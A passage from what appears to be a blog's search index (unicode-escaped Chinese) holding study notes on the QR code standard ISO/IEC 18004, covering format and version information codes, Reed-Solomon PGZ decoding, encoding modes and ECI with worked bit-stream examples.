\\(G(x)=x^{10}+x^8+x^5+x^4+x^2+x+1\\) \u5f97\u5230\u4f59\u6570\u8f6c\u6362\u4e3a\u540e 10 bits \u7684\u7ea0\u9519\u7801 \u4f8b\u5b50 \u7ea0\u9519\u7b49\u7ea7 M\uff0c\u63a9\u7801\u7f16\u53f7 101 5 bits \u6570\u636e\uff1a 00101 \u5199\u4e3a\u591a\u9879\u5f0f\uff1a \\(x^2+1\\) \u6574\u4f53\u4e58 \\(x^{10}\\) \uff1a \\(x^{12}+x^{10}\\) \u9664\u4ee5 \\(G(x)\\) \uff1a \u5546 \\(x^2\\) \uff0c\u4f59\u6570 \\(x^7+x^6+x^4+x^3+x^2\\) \u4f59\u6570\u8f6c\u4e3a 10 bits \u7ea0\u9519\u7801\uff1a 0011011100 \u52a0\u4e0a\u539f\u6570\u636e\uff1a 001010011011100 \u5f02\u6216 101010000010010 \uff1a 100000011001110 \u56e0\u4e3a 5 bits \u7684\u6570\u636e\u4e00\u5171\u53ea\u6709 32 \u79cd\u60c5\u51b5\uff0c\u6240\u4ee5\u9644\u5f55 C \u4e2d\u76f4\u63a5\u7ed9\u51fa\u4e86\u5b8c\u6574\u7684\u8868\u683c\uff1a \u7ea0\u9519 \uff1a\u6700\u591a\u53ef\u4ee5\u7ea0\u6b63 3 bits \u7684\u9519\u8bef\uff0c\u5148\u628a\u683c\u5f0f\u4fe1\u606f\u5f02\u6216 101010000010010 \u5f97\u5230\u539f\u59cb\u5e8f\u5217\uff0c\u7136\u540e\u4e0e Table C.1 \u4e2d\u7684\u6709\u6548\u683c\u5f0f\u4fe1\u606f\u8fdb\u884c\u5bf9\u6bd4\uff0c\u5982\u679c\u627e\u4e0d\u5230\u8bf4\u660e\u6709\u9519\u8bef\u3002\u6b64\u65f6\u4ec5\u9009\u62e9 Table C.1 \u4e2d\u4e0e\u9519\u8bef\u683c\u5f0f\u4fe1\u606f\u76f8\u5dee\u6bd4\u7279\u6700\u5c11\u7684\u4e00\u4e2a\u4f5c\u4e3a\u7ea0\u6b63\u540e\u7684\u683c\u5f0f\u4fe1\u606f\u5373\u53ef\uff0c\u5982\u679c\u76f8\u5dee\u5c11\u4e8e\u7b49\u4e8e 3 \u4e2a\u6bd4\u7279\uff0c\u5219\u89c6\u4e3a\u7ea0\u6b63\u6210\u529f \u586b\u5165\u4e8c\u7ef4\u7801 \u00b6 \u5de6\u4e0a\u89d2\u7684\u683c\u5f0f\u4fe1\u606f\u533a\u57df\u586b\u5145\u4e00\u4efd\u5b8c\u6574\u7684\u683c\u5f0f\u4fe1\u606f\uff08\u6700\u9ad8\u4f4d\u5728\u5de6\uff09\uff0c\u5de6\u4e0b\u89d2\u548c\u53f3\u4e0a\u89d2\u5408\u8d77\u6765\u662f\u4e00\u4efd\u5b8c\u6574\u7684\u683c\u5f0f\u4fe1\u606f\uff08\u6700\u9ad8\u4f4d\u5728\u5de6\u4e0b\u89d2\u7684\u6700\u4e0b\uff0c\u6700\u4f4e\u4f4d\u5728\u53f3\u4e0a\u89d2\u7684\u6700\u53f3\uff09\u3002\u5e76\u4e14\u5de6\u4e0b\u89d2\u7684\u683c\u5f0f\u4fe1\u606f\u4e0a\u65b9\uff08\u4f4d\u7f6e (4V+9,8) \uff09\u6709\u4e00\u5757\u59cb\u7ec8\u662f\u9ed1\u8272\uff1a \u7248\u672c\u4fe1\u606f\uff087.10\uff09 \u00b6 \u5728\u7248\u672c 7 \u53ca\u4ee5\u4e0a\u7684\u4e8c\u7ef4\u7801\u4e2d\u9700\u8981\u586b\u5165\u7248\u672c\u4fe1\u606f\u6765\u786e\u4fdd\u51c6\u786e\u5ea6 \u7248\u672c\u4fe1\u606f\u53ea\u50a8\u5b58\u4e86\u8be5\u4e8c\u7ef4\u7801\u7684\u7248\u672c\u53f7\uff087\uff5e40\uff09\uff0c\u4e00\u5171 18 bits\uff0c\u524d 6 bits \u4e3a\u7248\u672c\u53f7\u7684\u4e8c\u8fdb\u5236\uff08\u4ece 000111 \u5230 101000 \uff09\uff0c\u540e 12 bits \u4e3a\u7531 (18, 6) Golay code \u751f\u6210\u7684\u7ea0\u9519\u7801 \u4e0d\u540c\u4e8e\u683c\u5f0f\u4fe1\u606f\uff0c\u56e0\u4e3a\u7248\u672c\u53f7\u4e0d\u4f1a\u51fa\u73b0\u5168\u96f6\uff0c\u6240\u4ee5\u4e0d\u9700\u8981\u8fdb\u884c\u63a9\u7801\u64cd\u4f5c \u751f\u6210\u7ea0\u9519\u7801\uff08Annex D\uff09 \u00b6 \u548c\u683c\u5f0f\u4fe1\u606f\u7684\u7ea0\u9519\u7801\u7c7b\u4f3c\uff0c\u5148\u628a\u524d 6 bits \u8f6c\u4e3a\u591a\u9879\u5f0f\uff0c\u7136\u540e\u6574\u4f53\u4e58 \\(x^{12}\\) \uff0c\u5f97\u5230\u7684\u7ed3\u679c\u9664\u4ee5\u751f\u6210\u591a\u9879\u5f0f \\(G(x)=x^{12}+x^{11}+x^{10}+x^9+x^8+x^5+x^2+1\\) \uff0c\u628a\u4f59\u6570\u8f6c\u4e3a 12 bits \u4e8c\u8fdb\u5236\u5c31\u662f\u7ea0\u9519\u7801\u4e86 \u56e0\u4e3a\u53ea\u6709 34 \u4e2a\u7248\u672c\u6709\u7248\u672c\u4fe1\u606f\uff0c\u6240\u4ee5\u4e5f\u5c31\u53ea\u6709 34 \u79cd\u6709\u6548\u7684\u7248\u672c\u4fe1\u606f\u5e8f\u5217\uff0c\u9644\u5f55 D \u7684 Table D.1 \u4e2d\u7ed9\u51fa\u4e86\u5b8c\u6574\u7684 34 \u4e2a\u7248\u672c\u4fe1\u606f\u5e8f\u5217 \u548c\u683c\u5f0f\u4fe1\u606f\u4e00\u6837\uff0c\u7ea0\u9519\u65f6\u5bf9\u7167\u8868\u683c\u9009\u62e9\u76f8\u5dee\u6bd4\u7279\u6570\u6700\u5c0f\u7684\u5373\u53ef\u3002\u5e76\u4e14\u7248\u672c\u4fe1\u606f\u4e5f\u53ea\u80fd\u7ea0\u6b63\u5c0f\u4e8e\u7b49\u4e8e 3 \u4e2a\u9519\u8bef \u586b\u5165\u4e8c\u7ef4\u7801 \u00b6 \u5728\u7248\u672c 7 \u4ee5\u4e0a\u7684\u4e8c\u7ef4\u7801\u4e2d\u5df2\u7ecf\u9884\u7559\u51fa\u4e86\u4e24\u4e2a 6*3 \u5927\u5c0f\u7684\u533a\u57df\uff0c\u4e00\u4e2a\u4f4d\u4e8e\u5de6\u4e0b\u5206\u5272\u7ebf\u7684\u4e0a\u65b9\u65f6\u5e8f\u56fe\u6848\u5de6\u4fa7\uff0c\u4e00\u4e2a\u4f4d\u4e8e\u53f3\u4e0a\u5206\u5272\u7ebf\u5de6\u4fa7\u65f6\u5e8f\u56fe\u6848\u7684\u4e0a\u65b9 \u6309\u7167\u4e0b\u56fe\u987a\u5e8f\u586b\u5165\u5373\u53ef\uff1a \u89e3\u7801\uff0811\u3001Annex B\uff09 \u00b6 \u7b80\u8981\u7684\u89e3\u7801\u8fc7\u7a0b\uff1a \u5b9a\u4f4d\u5e76\u83b7\u53d6\u56fe\u50cf\u4e2d\u7684\u4e8c\u7ef4\u7801\uff0c\u5e76\u628a\u56fe\u50cf\u4e2d\u7684\u9ed1\u767d\u5757\u63d0\u53d6\u4e3a 1 \u548c 0 \u8bfb\u53d6\u683c\u5f0f\u4fe1\u606f \u91ca\u653e\u63a9\u7801 101010000010010 \u8fdb\u884c\u7ea0\u9519 \u5982\u679c\u7ea0\u9519\u5931\u8d25\u5219\u5c06\u4e8c\u7ef4\u7801\u955c\u9762\u5bf9\u79f0\u518d\u5c1d\u8bd5 \u8bfb\u53d6\u7248\u672c\u4fe1\u606f\uff08\u5982\u679c\u6709\u7684\u8bdd\uff09 \u8bfb\u53d6\u683c\u5f0f\u4fe1\u606f\u4e2d\u7684\u63a9\u7801\u7f16\u53f7\uff0c\u5e76\u91ca\u653e\u63a9\u7801 \u8bfb\u53d6\u5e76\u6062\u590d\u6570\u636e\u5b57\u548c\u7ea0\u9519\u5b57 \u7ea0\u9519\uff0c\u5982\u679c\u68c0\u6d4b\u5230\u4e86\u9519\u8bef\u5c31\u7ea0\u6b63 \u628a\u6570\u636e\u5b57\u89e3\u7801\u5f97\u5230\u7ed3\u679c \u7ea0\u9519\uff08Annex B\uff09 \u00b6 Annex B \u8bb2\u7684\u7ea0\u9519\u8fc7\u7a0b\u5f88\u7b80\u7565\uff0c\u800c\u4e14\u7b26\u53f7\u8bf4\u660e\u4e0d\u5168\uff0c\u5f88\u96be\u770b\u61c2 \u53bb\u5b66\u4e86\u5b66 PGZ \u89e3\u7801\uff1a Reed\u2013Solomon_error_correction#Peterson\u2013Gorenstein\u2013Zierler_decoder \u8bbe\u5f53\u524d\u7248\u672c\u4e0b\u6bcf\u5757\u4e2d\u6709 \\(n\\) \u4e2a\u5b57\uff0c \\(k\\) \u4e2a\u6570\u636e\u5b57\uff0c \\(n-k\\) \u4e2a\u7ea0\u9519\u5b57\uff0c\u7ea0\u9519\u5bb9\u91cf\u4e3a \\(\\nu\\) \u9996\u5148\u5b9a\u4e49\u539f\u6765\u7684\u5b8c\u6574\u6570\u636e\uff08\u5373\u6570\u636e\u5b57\u548c\u7ea0\u9519\u5b57\uff09\u4ece\u9ad8\u4f4d\u5230\u4f4e\u4f4d\u4e3a \\(c_{n-1},c_{n-2},\\cdots,c_0\\) \uff0c\u5bf9\u5e94\u591a\u9879\u5f0f\u4e3a\uff1a \\[s(x)=\\sum_{i=0}^{n-1}c_ix^i=c_{n-1}x^{n-1}+c_{n-2}x^{n-2}+\\cdots+c_0\\] \u800c\u4e14\u6839\u636e\u7ea0\u9519\u7801\u751f\u6210\u539f\u7406\uff0c \\(s(x)\\) \u53ef\u4ee5\u88ab\u751f\u6210\u591a\u9879\u5f0f \\(g(x)\\) \u6574\u9664\uff0c\u5176\u4e2d \\[g(x)=\\prod_{i=0}^{n-k-1}(x-\\alpha^i)\\] \u6240\u4ee5 \\(s(x)\\) \u4e5f\u6709\u6839 \\(s(\\alpha^i)=0, i=0,1,\\dots n-k-1\\) \u518d\u8bbe\u63a5\u6536\u5230\u7684\u6d88\u606f\u591a\u9879\u5f0f\uff08\u53ef\u80fd\u6709\u9519\uff09\u4e3a \\(r(x)\\) \uff0c\u8bef\u5dee\u591a\u9879\u5f0f\u4e3a \\(e(x)\\) \uff0c\u6ee1\u8db3\uff1a \\[r(x)=s(x)+e(x),\\quad e(x)=\\sum_{i=0}^{n-1}e_ix^i\\] \u5148\u8bbe\u4e00\u5171\u6709 \\(\\nu\\) \u4e2a\u9519\u8bef\uff0c\u4e14\u6bcf\u4e2a\u9519\u8bef\u7684\u4f4d\u7f6e\u4e3a \\(i_k,k=0,1,\\dots \\nu-1\\) \uff0c\u6240\u4ee5\u6709\uff1a \\[e(x)=\\sum_{k=0}^{\\nu-1}e_{i_k}x^{i_k}\\] \u6700\u7ec8\u7684\u76ee\u6807\u5c31\u662f\u627e\u5230\u9519\u8bef\u4e2a\u6570 \\(\\nu\\) \uff0c\u9519\u8bef\u4f4d\u7f6e \\(i_k\\) \uff0c\u4ee5\u53ca\u9519\u8bef\u5927\u5c0f \\(e_{i_k}\\) \u8ba1\u7b97\u5178\u578b\u503c \u00b6 \u9996\u5148\u5b9a\u4e49\u5178\u578b\u503c\uff08syndromes\uff09\u4e3a\u628a \\(\\alpha^j\\) \u4f20\u5165 \\(r(x)\\) \u5f97\u5230\u7684\u503c \\(S_j\\) \uff0c\u6709\uff1a \\[S_j=r(\\alpha^j)=s(\\alpha^j)+e(\\alpha^j)=e(\\alpha^j)=\\sum_{k=0}^{\\nu-1}e_{i_k}(\\alpha^j)^{i_k},j=0,1,\\dots,n-k-1\\] \u6b64\u65f6\u5982\u679c\u5f97\u5230\u7684\u5178\u578b\u503c\u90fd\u4e3a 0\uff0c\u90a3\u8bf4\u660e\u6ca1\u6709\u9519\u8bef \u4e3a\u4e86\u65b9\u4fbf\uff0c\u518d\u4ee4 \\(X_k=\\alpha^{i_k},Y_k=e_{i_k}\\) \uff0c\u8fd9\u6837 \\(X_k\\) \u4e5f\u80fd\u7528\u6765\u5b9a\u4f4d\u9519\u8bef\uff0c\u540c\u65f6\u4e5f\u6709\uff1a \\[S_j=\\sum_{k=0}^{\\nu-1}Y_kX_k^j\\] \u5199\u6210\u77e9\u9635\u5f62\u5f0f\u5c31\u662f\uff1a \\[\\begin{bmatrix} X_0^0 &X_2^0 &\\cdots &X_{\\nu-1}^0\\\\\\\\ X_0^1 &X_1^1 &\\cdots &X_{\\nu-1}^1\\\\\\\\ \\vdots &\\vdots & &\\vdots\\\\\\\\ X_0^{n-k-1} &X_1^{n-k-1} &\\cdots &X_{\\nu-1}^{n-k-1} \\end{bmatrix} \\begin{bmatrix} Y_0\\\\\\\\Y_1\\\\\\\\\\vdots\\\\\\\\Y_{\\nu-1} \\end{bmatrix}= \\begin{bmatrix} S_0\\\\\\\\S_1\\\\\\\\\\vdots\\\\\\\\S_{n-k-1} \\end{bmatrix}\\] \u6240\u4ee5\u53ea\u8981\u6c42\u5f97\u4f4d\u7f6e \\(X_k\\) \u5c31\u80fd\u5f97\u5230\u9519\u8bef\u5927\u5c0f\uff0c\u4f46\u662f\u6b64\u65f6\u5e76\u4e0d\u662f\u7ebf\u6027\u7684 \u9519\u8bef\u5b9a\u4f4d\u591a\u9879\u5f0f \u00b6 \u5b9a\u4e49\u4e00\u4e2a\u9519\u8bef\u5b9a\u4f4d\u591a\u9879\u5f0f\uff08error locator polynomial\uff09 \\(\\Lambda(x)\\) \uff1a \\[\\Lambda(x)=\\prod_{k=0}^{\\nu-1}(1-xX_k)=1+\\Lambda_1x+\\Lambda_2x^2+\\cdots+\\Lambda_\\nu x^\\nu\\] \u53ef\u4ee5\u770b\u51fa \\(\\Lambda(X_k^{-1})=0\\) \uff0c\u6240\u4ee5\u5bf9\u4e8e \\(0\\leq j\\leq\\nu-1\\) \u6709\uff1a \\[ Y_kX_k^{j+\\nu}\\Lambda(X_k^{-1}) =0 \\] \\[ Y_{k}X_{k}^{j+\\nu }(1+\\Lambda _{1}X_{k}^{-1}+\\Lambda _{2}X_{k}^{-2}+\\cdots +\\Lambda _{\\nu }X_{k}^{-\\nu })=0 \\] \\[ Y_{k}X_{k}^{j+\\nu }+\\Lambda _{1}Y_{k}X_{k}^{j+\\nu }X_{k}^{-1}+\\Lambda _{2}Y_{k}X_{k}^{j+\\nu }X_{k}^{-2}+\\cdots +\\Lambda _{\\nu }Y_{k}X_{k}^{j+\\nu }X_{k}^{-\\nu }=0 \\] \\[ Y_{k}X_{k}^{j+\\nu }+\\Lambda _{1}Y_{k}X_{k}^{j+\\nu -1}+\\Lambda _{2}Y_{k}X_{k}^{j+\\nu -2}+\\cdots +\\Lambda _{\\nu }Y_{k}X_{k}^{j}=0 \\] \u6240\u4ee5\u628a \\(k\\) \u4ece \\(0\\) \u5230 \\(\\nu-1\\) \u7d2f\u52a0\u8d77\u6765\u4e5f\u4e3a 0\uff1a \\[\\sum_{k=0}^{\\nu-1}\\left(Y_{k}X_{k}^{j+\\nu }+\\Lambda _{1}Y_{k}X_{k}^{j+\\nu -1}+\\Lambda _{2}Y_{k}X_{k}^{j+\\nu -2}+\\cdots +\\Lambda _{\\nu }Y_{k}X_{k}^{j}\\right)=0\\] \u7136\u540e\u8f6c\u6362\u4e3a\u6bcf\u9879\u7d2f\u52a0\u5e76\u63d0\u53d6\u51fa \\(\\Lambda_i\\) \uff1a \\[\\left(\\sum _{k=1}^{\\nu }Y_{k}X_{k}^{j+\\nu }\\right)+\\Lambda _{1}\\left(\\sum _{k=1}^{\\nu }Y_{k}X_{k}^{j+\\nu -1}\\right)+\\cdots +\\Lambda _{\\nu }\\left(\\sum _{k=1}^{\\nu }Y_{k}X_{k}^{j}\\right)=0\\] \u6839\u636e\u5178\u578b\u503c\u7684\u5b9a\u4e49\u6709\uff1a \\[S_{j+\\nu}+\\Lambda_1S_{j+\\nu-1}+\\cdots+\\Lambda_\\nu S_k=0\\] \u628a \\(S_{j+\\nu}\\) \u79fb\u5230\u53f3\u8fb9\uff0c\u5e76\u5c55\u5f00\u6240\u6709 \\(j\\) \u53ef\u4ee5\u5f97\u5230\u77e9\u9635\u5f62\u5f0f\uff1a \\[\\begin{bmatrix} S_{0}&S_{1}&\\cdots &S_{\\nu-1}\\\\\\\\S_{1}&S_{2}&\\cdots &S_{\\nu}\\\\\\\\\\vdots &\\vdots &&\\vdots \\\\\\\\S_{\\nu-1}&S_{\\nu}&\\cdots &S_{2\\nu -2} \\end{bmatrix} \\begin{bmatrix}\\Lambda _{\\nu }\\\\\\\\\\Lambda _{\\nu -1}\\\\\\\\\\vdots \\\\\\\\\\Lambda _{1} \\end{bmatrix} = \\begin{bmatrix} -S_{\\nu}\\\\\\\\-S_{\\nu +1}\\\\\\\\\\vdots \\\\\\\\-S_{2\\nu-1 } \\end{bmatrix}\\] \u6b64\u65f6\u662f\u4e00\u4e2a\u7ebf\u6027\u65b9\u7a0b\u7ec4\uff0c\u800c\u4e14 \\(S_i\\) \u5168\u90e8\u5df2\u77e5\uff0c\u53ef\u4ee5\u89e3\u5f97 \\(\\Lambda_i\\) \u5f97\u5230\u9519\u8bef\u4f4d\u7f6e\u548c\u5927\u5c0f \u00b6 \u6b64\u65f6\u591a\u9879\u5f0f \\(\\Lambda(x)\\) \u5df2\u7ecf\u5b8c\u5168\u5df2\u77e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u6c42\u5f97\u5176\u6839\uff08\u7528 Chien search \u7b97\u6cd5\u5728\u4f3d\u7f57\u74e6\u57df\u4e0a\u6c42\u6839\uff09 \u518d\u7b97\u5176\u5012\u6570\u5373\u53ef\u5f97\u5230 \\(X_k\\) \uff0c\u7136\u540e\u53ef\u4ee5\u5bfb\u627e\u5230\u9519\u8bef\u4f4d\u7f6e \\(i_k\\) \u8fd9\u65f6\u4e5f\u5c31\u53ef\u4ee5\u5e26\u5165\u7b2c\u4e00\u4e2a\u65b9\u7a0b\u7ec4\u6c42\u5f97\u9519\u8bef\u5927\u5c0f \\(Y_k\\) \uff08\u6216\u8005\u5229\u7528 Forney algorithm\uff09 \u5f97\u5230\u4e86 \\(e(x)\\) \u540e\u5c31\u53ef\u4ee5\u6839\u636e \\(r(x)\\) \u7b97\u51fa\u539f\u59cb\u4fe1\u606f \\(s(x)\\) \u4e86","title":"QRCode"},{"location":"ctf/qrcode/#qrcode","text":"\u6700\u8fd1\u51e0\u6b21\u6bd4\u8d5b\u9047\u5230\u8fc7\u597d\u51e0\u6b21\u4e8c\u7ef4\u7801\u7684\u9898\u76ee\uff0c\u6253\u7b97\u597d\u597d\u6765\u8bfb\u4e00\u8bfb\u6807\u51c6\u6587\u6863 ISO/IEC 18004:2015 \u6587\u6863 6.1 \u524d\u9762\u7684\u5185\u5bb9\u4e0d\u591a\uff0c\u5c31\u4ece\u5b83\u540e\u9762\u5f00\u59cb\u8bb0\u4e86","title":"\u4e8c\u7ef4\u7801 QRCode \u6807\u51c6\u9605\u8bfb"},{"location":"ctf/qrcode/#6163","text":"","title":"\u57fa\u7840\u63cf\u8ff0\u53ca\u7ed3\u6784\uff086.1\u30016.3\uff09"},{"location":"ctf/qrcode/#5361","text":"\u5757\u4f4d\u7f6e\uff1a\u5de6\u4e0a\u89d2\u4e3a\u539f\u70b9 (0, 0) \u5411\u4e0bx+\uff0c\u5411\u53f3y+ \u7248\u672c\u8868\u793a\uff1aVersion V-E\uff08\u5176\u4e2dV\u662f\u7248\u672c\u53f7\uff0cE\u662f\u7ea0\u9519\u7b49\u7ea7\uff09 \u6570\u636e\u8868\u793a\uff1a\u9ed1\u5757-1 \u767d\u5757-0\uff08\u53ef\u4ee5\u5e26\u80cc\u666f\u5168\u90e8\u53cd\u8272\uff09 \u5927\u5c0f\uff1a\u4ece\u7248\u672c1\u5230\u7248\u672c40\u4f9d\u6b21\u662f 21x21 \uff5e 177x177\uff08\u6bcf\u589e\u52a0\u4e00\u4e2a\u7248\u672c\uff0c\u8fb9\u957f\u589e\u52a04\uff09 \u652f\u6301\u7684\u6700\u591a\u5b57\u7b26\u6570\uff08\u7248\u672c40\uff09 \u6570\u5b57\u6a21\u5f0f\uff1a7089 \u5b57\u6bcd\u6a21\u5f0f\uff1a4296 \u5b57\u8282\u6a21\u5f0f\uff1a2953 \u65e5\u6587\u6a21\u5f0f\uff1a1817 \u7ea0\u9519\u7b49\u7ea7\u5141\u8bb8\u7684\u6062\u590d\u6bd4\u4f8b L\uff1a7% M\uff1a15% Q\uff1a25% H\uff1a30%","title":"\u57fa\u7840\u63cf\u8ff0\uff085.3\u30016.1\uff09"},{"location":"ctf/qrcode/#63","text":"\u529f\u80fd\u56fe\u6848\uff08function patterns\uff09 \u7279\u5f81\u7b26\uff08finder pattern\uff097x7\u9ed1\u5708 5x5\u767d\u5708 3x3\u9ed1\u5757 \u5206\u5272\u7ebf\uff08separator\uff09\u5728\u7279\u5f81\u7b26\u5468\u56f4\u7684\u4e00\u5708\u5168\u767d\u533a\u57df \u65f6\u5e8f\u56fe\u6848\uff08timing patterns\uff09\u7b2c7\u884c\u7b2c7\u5217\u7684\u4e24\u6761\u9ed1\u767d\u6761\u7eb9 \u5bf9\u9f50\u56fe\u6848\uff08alignment patterns\uff09\u7248\u672c1\u65e0\uff0c\u7248\u672c2-6 1\u4e2a\uff0c\u7248\u672c7-13 6\u4e2a\u2026\u2026\uff08\u9644\u5f55E\uff09 \u9759\u9ed8\u533a\uff08quiet zone\uff09\u81f3\u5c114\u4e2a\u5355\u4f4d\u5bbd \u7f16\u7801\u533a\u57df\uff08encoding region\uff09 \u683c\u5f0f\u4fe1\u606f\uff08format information\uff09\u5de6\u4e0a\u89d2\u5206\u5272\u7ebf\u5916\u4e00\u5708\uff0c\u5de6\u4e0b\u89d2\u5206\u5272\u7ebf\u53f3\u4fa7\uff0c\u53f3\u4e0a\u89d2\u5206\u5272\u7ebf\u4e0b\u4fa7 \u7248\u672c\u4fe1\u606f\uff08version information\uff09\u7248\u672c7\u540e\u624d\u6709\uff0c\u5728\u5de6\u4e0b\u5206\u5272\u7ebf\u4e0a\u4fa7\uff0c\u53f3\u4e0a\u5206\u5272\u7ebf\u5de6\u4fa7 \u6570\u636e\u53ca\u7ea0\u9519\u7801\u533a\u57df","title":"\u4e8c\u7ef4\u7801\u7ed3\u6784\uff086.3\uff09"},{"location":"ctf/qrcode/#74","text":"","title":"\u6570\u636e\u7f16\u7801\uff087.4\uff09"},{"location":"ctf/qrcode/#741","text":"\u9ed8\u8ba4\u7684 ECI \u6a21\u5f0f\u4e0b\uff0c\u6bd4\u7279\u6d41\u4ee5\u6a21\u5f0f\u6807\u8bc6\u7b26\u5f00\u59cb\u3002\u5982\u679c\u4e0d\u662f\u9ed8\u8ba4 ECI \u6a21\u5f0f\uff0c\u5219\u9700\u8981\u4ece ECI \u5934\u5f00\u59cb\uff1a \uff084 bits\uff09ECI \u6a21\u5f0f\u6807\u8bc6\u7b26 \uff088/16/24 bits\uff09ECI Designator \u6bd4\u7279\u6d41\u7684\u5269\u4f59\u90e8\u5206\u7531\u4e0b\u9762\u51e0\u90e8\u5206\u7ec4\u6210\uff1a \uff084 bits\uff09\u6a21\u5f0f\u6807\u8bc6\u7b26 \u5b57\u7b26\u6570\u91cf\u6807\u8bc6\u7b26\uff08\u957f\u5ea6\u89c1\u4e0b\u7b2c\u4e8c\u4e2a\u8868\uff09 \u6570\u636e\u6bd4\u7279\u6d41 \u6a21\u5f0f \u6807\u8bc6\u7b26 \u8bf4\u660e ECI 0111 \u6570\u5b57\u6a21\u5f0f 0001 \u53ea\u5305\u542b\u6570\u5b570-9\uff0c3\u4e2a\u6570\u5b57 10 bits \u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f 0010 45\u4e2a\u5b57\u7b26\uff0c0-9A-Z \u53ca9\u4e2a\u7b26\u53f7 \u7a7a\u683c$%*+-./:\uff0c2\u4e2a\u5b57\u7b26 11 bits \u5b57\u8282\u6a21\u5f0f 0100 \u6bcf\u4e2a\u5b57\u7b26 8 bits \u65e5\u672c\u6c49\u5b57\u6a21\u5f0f 1000 \u7ed3\u6784\u6dfb\u52a0\u6a21\u5f0f 0011 \u7248\u672c \u6570\u5b57\u6a21\u5f0f\u5b57\u7b26\u6570\u91cf\u6807\u8bc6\u7b26\u957f\u5ea6 \u5b57\u6bcd\u6a21\u5f0f\u2026\u2026 \u5b57\u8282\u6a21\u5f0f\u2026\u2026 \u65e5\u6587\u6a21\u5f0f\u2026\u2026 1\uff5e9 10 9 8 8 10\uff5e26 12 11 16 10 27\uff5e40 14 13 16 12","title":"\u6570\u636e\u5e8f\u5217\uff087.4.1\uff09"},{"location":"ctf/qrcode/#eci-742","text":"ECI \u6a21\u5f0f\u5373\u4f7f\u7528\u67d0\u4e9b\u7279\u5b9a\u7684\u5b57\u7b26\u6620\u5c04\u6765\u628a\u5b57\u7b26\u8f6c\u6362\u4e3a\u6bd4\u7279\u6d41 \u800c\u4e14\u90fd\u4f7f\u7528\u5b57\u8282\u6a21\u5f0f\u6765\u8868\u793a\u6570\u636e\uff08\u5373\u5728 ECI \u5934\u540e\u7684\u6a21\u5f0f\u6807\u8bc6\u7b26\u4e3a\u5b57\u8282\u6a21\u5f0f\u7684 0100\uff09 \u6bcf\u4e2a ECI \u90fd\u6709\u4e00\u4e2a\u516d\u4f4d\u6570\u7f16\u53f7\uff08assignment value\uff09\uff0c\u53ef\u80fd\u5360 1\u30012\u30013 \u4e2a codewords\uff0c\u5177\u4f53\u6807\u8bc6\u65b9\u5f0f\u89c1\u4e0b\u8868\uff08\u53601\u4e2a codewords \u65f6\u5f00\u5934\u4e00\u5b9a\u662f0\uff0c\u53602\u4e2a\u65f6\u5f00\u5934\u4e00\u5b9a\u662f10\uff0c\u53603\u4e2a\u65f6\u5f00\u5934\u4e00\u5b9a\u662f110\uff09\u8868\u4e2d xxxxxxxx \u8868\u793a\u7f16\u53f7\u7684\u4e8c\u8fdb\u5236 ECI Assignment Value Codewords values 000000 \uff5e 000127 0xxxxxxx 000000 \uff5e 016383 10xxxxxx xxxxxxxx 000000 \uff5e 999999 110xxxxx xxxxxxxx xxxxxxxx \u800c\u4e14 ECI \u6a21\u5f0f\u4e0b\u4e2d\u9014\u53ef\u4ee5\u66f4\u6362 ECI \u6307\u793a\u5668\uff0c\u4e00\u4e2a 5C\uff0801011100\uff09\u8868\u793a\u6362\u65b0\u7684 ECI\uff0c\u540e\u9762\u8981\u63a56\u4e2a codewords \u53736\u4e2a\u6570\u5b57\uff08\u5341\u516d\u8fdb\u523630\uff5e39\uff09\u8868\u793a\u7f16\u53f7\uff0c\u800c\u4e0d\u662f\u7528\u4e0a\u8868\u4e2d\u7684\u8868\u793a\u65b9\u6cd5\u3002\u800c 5C \u6b63\u5e38\u60c5\u51b5\u4e0b\u8868\u793a \uff0c\u6240\u4ee5\u8868\u793a \u8fd9\u4e2a\u539f\u6570\u636e\u9700\u8981\u7528\u4e24\u4e2a 5C \u4f8b\u5b50 1 \u4f7f\u7528 ISO/IEC 8859-7\uff08ECI 000009\uff09\u6765\u8868\u793a\u5e0c\u814a\u5b57\u6bcd\u0391\u0392\u0393\u0394\u0395\uff08\u8be5 ECI \u4e0b\u8868\u793a\u4e3a\u5341\u516d\u8fdb\u5236 A1 A2 A3 A4 A5\uff09 \u6bd4\u7279\u6d41\uff1a ECI \u6807\u8bc6\u7b26\uff1a 0111 ECI \u7f16\u53f7\uff1a 00001001 \u5b57\u8282\u6a21\u5f0f\u6807\u8bc6\u7b26\uff1a 0100 \u5b57\u7b26\u6570\u91cf\uff1a 00000101 \uff085\u4e2a\u5b57\u7b26\uff09 \u6570\u636e\uff1a 10100001 10100010 10100011 10100100 10100101 \u6240\u4ee5\u6700\u7ec8\u7684\u6bd4\u7279\u6d41\uff1a 0111 00001001 0100 00000101 10100001 10100010 10100011 10100100 10100101 \u4f8b\u5b50 2\uff0814.3\uff09 \u9700\u8981\u7f16\u7801\u7684\u6570\u636e\uff1aABC\\123456 \u6570\u636e\u6d41\u4e2d\u5341\u516d\u8fdb\u5236\uff08\u5b57\u8282\u6a21\u5f0f\u6807\u8bc6\u7b260100\u540e\uff09\uff1a41 42 43 5C 5C 31 32 33 34 35 36 \u9700\u8981\u7f16\u7801\u7684\u6570\u636e\uff1aABC<\u540e\u63a5 ECI 123456 \u4e0b\u7684\u6570\u636e\u2026\u2026> \u6570\u636e\u6d41\u4e2d\u5341\u516d\u8fdb\u5236\uff08\u5b57\u8282\u6a21\u5f0f\u6807\u8bc6\u7b260100\u540e\uff09\uff1a41 42 43 5C 31 32 33 34 35 36 \u2026\u2026","title":"ECI \u6a21\u5f0f\uff087.4.2\uff09"},{"location":"ctf/qrcode/#743","text":"\u8f93\u5165\u7684\u6570\u5b57\u5b57\u7b26\u4e32\uff08\u56e0\u4e3a\u5f00\u5934\u53ef\u4ee5\u662f0\uff09\u8981\u88ab\u5206\u62103\u4e2a\u4e00\u7ec4\uff0c\u6bcf\u7ec4\u4f1a\u8f6c\u6362\u4e3a 10 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff08999 -> 1111100111 \uff09\u3002\u5269\u4f59\u4e0d\u52303\u4e2a\u7684\u90e8\u5206\uff0c\u5982\u679c\u52692\u4e2a\u6570\u5b57\uff0c\u5219\u5c06\u5176\u8f6c\u6362\u4e3a 7 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff0899 -> 1100011 \uff09\u5982\u679c\u52691\u4e2a\u6570\u5b57\uff0c\u5219\u5c06\u5176\u8f6c\u6362\u4e3a 4 bits 